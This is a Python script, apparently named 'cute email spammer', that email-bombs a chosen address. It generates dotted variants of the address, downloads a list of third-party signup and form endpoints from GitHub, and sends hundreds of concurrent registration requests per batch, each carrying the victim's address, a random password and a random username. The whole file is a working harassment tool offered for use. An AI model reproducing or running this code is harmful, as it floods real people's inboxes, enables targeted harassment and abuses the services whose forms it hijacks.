import asyncio, aiohttp, time, re, random, string, itertools, os, json

# CONFIG ^_^
size = 500 # threads per iteration
cap = None  # thread limit / set to None for unlimited (i do NOT recommend higher than 1000)

# skidded from chatgpt lololol!!
def generate_email_variants(email):
    username, domain = email.split("@")
    variants = []

    for i in range(1, len(username)):
        for combo in itertools.combinations(range(1, len(username)), i):
            variant = username
            for index in reversed(combo):
                variant = variant[:index] + '.' + variant[index:]
            variants.append(variant)

    results = [email] + list(
        sorted(dict.fromkeys([variant + "@" + domain
                              for variant in variants])))
    return results


# skidded from chelpus XD!!!!
def generate_username(length: int = 5):
    min_lc = ord('a')
    len_lc = 26
    ba = bytearray(os.urandom(length))
    for i, b in enumerate(ba):
        ba[i] = min_lc + b % len_lc
    return str(time.time()).replace(".", "") + ba.decode('ascii')


# skidded from regex ^_^
def validate_email(email):
    return re.match(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", email)


# skidded from "Laurence Gonsalves" on stackoverflow
def clamp(value, min_value, max_value):
    return max(min_value, min(value, max_value))

def divide():
    print("-" * 20)


progress = 0


def update_progress():
    global progress
    progress += 1
    decimal = progress / total
    amount = 30
    white = "█" * int(amount - int((1 - decimal) * amount))
    black = "░" * int(amount - int(decimal * amount))
    print(f"⚡ {progress}/{total} {round(decimal*100, 1):.1f}%「{white}{black}」", end="\r")
    if progress >= total:
        print("\r")

async def fetch(session: aiohttp.ClientSession, sub: str, info):
    def fix(lol):
        return json.loads(json.dumps(lol)
            .replace("{email}", sub)
            .replace("{password}", password)
            .replace("{random}", rng)
            .replace("{username}", generate_username())
            .replace("{frenchnumber}", str(random.randint(100_000_000, 999_999_999)))
            )
    try:
        url = info.get("url")
        method = info.get("method", "POST").upper()
        js = info.get("json")
        rng = "".join(random.choices(string.ascii_lowercase, k=10))
        if js is not None:
            js = fix(js)
        data = info.get("data")
        if data is not None:
            data = fix(data)
        params = info.get("params")
        headers = info.get("headers")
        cookies = info.get("cookies")
        await session.request(
            method=method,
            url=url, 
            params=params,
            json=js,
            data=data,
            headers=headers,
            cookies=cookies
        )
    except Exception:
        pass
    update_progress()

async def main():
    async with aiohttp.ClientSession() as session:
        try:
            with open("functions.json", "r") as file:
                functions = json.load(file)
            with open("functions.json", "w") as file:
                json.dump(functions, file, indent=2)
        except Exception:
            print("no data found, downloading...")
            async with session.get("https://raw.githubusercontent.com/Inkthirsty/cute-email-spammer/main/functions.json") as resp:
                functions = await resp.json()
                print("beep boop data downloaded")
        # https://patorjk.com/software/taag/#p=display&h=1&v=1&f=Bloody&t=CUTE%20EMAIL%20SPAMMER
        print("""
        ▄████▄   █    ██ ▄▄▄█████▓▓█████    ▓█████  ███▄ ▄███▓ ▄▄▄       ██▓ ██▓         ██████  ██▓███   ▄▄▄       ███▄ ▄███▓ ███▄ ▄███▓▓█████  ██▀███  
        ▒██▀ ▀█   ██  ▓██▒▓  ██▒ ▓▒▓█   ▀    ▓█   ▀ ▓██▒▀█▀ ██▒▒████▄    ▓██▒▓██▒       ▒██    ▒ ▓██░  ██▒▒████▄    ▓██▒▀█▀ ██▒▓██▒▀█▀ ██▒▓█   ▀ ▓██ ▒ ██▒
        ▒▓█    ▄ ▓██  ▒██░▒ ▓██░ ▒░▒███      ▒███   ▓██    ▓██░▒██  ▀█▄  ▒██▒▒██░       ░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄  ▓██    ▓██░▓██    ▓██░▒███   ▓██ ░▄█ ▒
        ▒▓▓▄ ▄██▒▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄    ▒▓█  ▄ ▒██    ▒██ ░██▄▄▄▄██ ░██░▒██░         ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██    ▒██ ▒██    ▒██ ▒▓█  ▄ ▒██▀▀█▄  
        ▒ ▓███▀ ░▒▒█████▓   ▒██▒ ░ ░▒████▒   ░▒████▒▒██▒   ░██▒ ▓█   ▓██▒░██░░██████▒   ▒██████▒▒▒██▒ ░  ░ ▓█   ▓██▒▒██▒   ░██▒▒██▒   ░██▒░▒████▒░██▓ ▒██▒
        ░ ░▒ ▒  ░░▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ ░   ░░ ▒░ ░░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░ ▒░▓  ░   ▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ░  ░░ ▒░   ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░
        ░  ▒   ░░▒░ ░ ░     ░     ░ ░  ░    ░ ░  ░░  ░      ░  ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░   ░ ░▒  ░ ░░▒ ░       ▒   ▒▒ ░░  ░      ░░  ░      ░ ░ ░  ░  ░▒ ░ ▒░
        ░         ░░░ ░ ░   ░         ░         ░   ░      ░     ░   ▒    ▒ ░  ░ ░      ░  ░  ░  ░░         ░   ▒   ░      ░   ░      ░      ░     ░░   ░ 
        ░ ░         ░                 ░  ░      ░  ░       ░         ░  ░ ░      ░  ░         ░                 ░  ░       ░          ░      ░  ░   ░     
        ░                                                                                                                                                 
        """)
        global progress, total, password
        password = ""
        samples = [string.ascii_lowercase, string.ascii_uppercase, string.digits]
        for _ in samples:
            password += "".join(random.sample(_, k=5))
        password = "!" + "".join(random.sample(password, k=len(password)))

        email = None
        while True:
            email = input("type cute email address here: ").strip().lower()
            if validate_email(email):
                break
            print("🤬 invalid email")

        if len(email.split("@")[0]) >= 30:
            variants = [email]
        else:
            variants = generate_email_variants(email)

        threads = None
        print("(i do NOT recommend more than 1000 threads)")
        while True:
            try:
                limit = clamp(len(variants), 1, cap or float("inf"))
                threads = input(f"threads per batch (1-{limit}): ")
                if threads == "":
                    threads = limit
                threads = clamp(int(threads), 1, limit)
                break
            except:
                print("🤬 that is not a number")

        variants = variants[:threads]
        total = len(functions) * len(variants)
        divide()
        print("📌 useless session info")
        info = {
            "THREADS": threads,
            "EMAIL": email,
            "PASSWORD": password,
        }
        print("\n".join([f"{k.upper()}: {v}" for k, v in info.items()]))
        divide()
        print(f"😼 sending some cute emails :3")
        print("🔋 initializing...", end="\r")
        start = time.time()
        tasks = [asyncio.create_task(fetch(session, sub, values)) for sub in variants for values in functions.values()]
        for j in range(0, len(tasks), size):
            await asyncio.gather(*tasks[j:j+size])
            await asyncio.sleep(1)
    print(f"🤣 attempted to send {total:,} emails in {round(time.time() - start, 3):.3f} seconds")
    print("😤 keep in mind that some emails can be delayed or never arrive")
    print("👋 have a nice day ^_^")
    await asyncio.sleep(10)  # intentional delay before the program commits suicide

if __name__ == "__main__":
    try:
        # real programmers would tell me this is unnecessary but i hate the constant "EVENT LOOP ENDED" errors so this shuts it up sometimes
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    except Exception:
        pass
    asyncio.run(main())
